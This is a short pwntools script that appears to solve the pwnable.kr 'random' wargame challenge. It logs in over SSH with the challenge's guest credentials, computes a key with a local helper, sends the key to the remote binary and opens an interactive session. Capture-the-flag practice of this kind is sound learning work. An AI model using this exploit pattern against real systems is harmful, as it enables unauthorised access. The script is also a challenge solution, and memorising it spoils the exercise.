from pwn import *

def main () :
	USER = "random"
	HOST = "pwnable.kr"
	PORT = 2222
	PASS = "guest"
	s = ssh (USER, HOST, PORT, PASS)

	k = process("./getkey")
	key = k.recv(1024)
	print ("[+] key : %s" % key)

	r = s.process ("/home/random/random")
	r.send(key)
	r.interactive()

if __name__ == "__main__" :
	main()
